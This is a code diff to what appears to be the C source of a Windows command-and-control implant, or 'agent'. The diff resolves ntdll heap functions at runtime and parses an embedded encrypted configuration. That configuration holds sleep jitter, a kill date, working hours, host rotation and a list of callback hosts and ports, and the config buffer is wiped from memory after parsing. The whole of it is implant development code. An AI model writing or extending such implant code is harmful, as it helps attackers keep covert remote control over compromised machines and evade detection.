@@ -5,6 +5,7 @@
 #include "parser.h"
 #include "Helpers.h"
 #include "token.h"
+#include "ListManager.h"
 
 BYTE AgentConfigBytes[] = CONFIG_BYTES;
 BYTE ConfigIVBytes[] = CONFIG_IV_BYTES;
@@ -117,6 +118,14 @@ INT init_agent(pAgent agent) {
     if (!agent->pNtQueryInformationToken) {
         return -1;
     }
+    agent->pRtlAllocateHeap = (t_RtlAllocateHeap)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAllocateHeap");
+    if (!agent->pRtlAllocateHeap) {
+        return -1;
+    }
+    agent->pRtlReAllocateHeap = (t_RtlReAllocateHeap)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlReAllocateHeap");
+    if (!agent->pRtlReAllocateHeap) {
+        return -1;
+    }
 
     //obtain kernel32 apis
     agent->pGetComputerNameExA = (t_GetComputerNameExA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetComputerNameExA");
@@ -199,6 +208,10 @@ INT init_agent(pAgent agent) {
 INT ParseConfig(pAgent agent) {
 
     PARSER parser = { 0 };
+    INT NumHosts = 0;
+    PWCHAR Addr = NULL;
+    INT Port = 0;
+    INT Length = 0;
 
     NewParser(&parser, AgentConfigBytes, sizeof(AgentConfigBytes));
 	RtlSecureZeroMemory(AgentConfigBytes, sizeof(AgentConfigBytes)); //clear the config buffer from memory we've copied it to the parser.
@@ -215,7 +228,16 @@ INT ParseConfig(pAgent agent) {
 	agent->config->SleepJitter = ParserReadInt32(&parser);
 	agent->config->KillDate = ParserReadInt64(&parser);
 	agent->config->WorkingHours = ParserReadInt32(&parser);
-    //agent->config->listenerConfig = 
+    agent->config->listenerConfig.HostRotation = ParserReadInt32(&parser);
+    
+    NumHosts = ParserReadInt32(&parser);
+    for (int i = 0; i < NumHosts; i++) {
+        Addr = ParserReadWString(&parser, &Length);
+        Port = ParserReadInt32(&parser);
+        if (Length > 0) {
+            AddHost(agent, Addr, Length, Port);
+        }
+    }
 
 
     return 0;
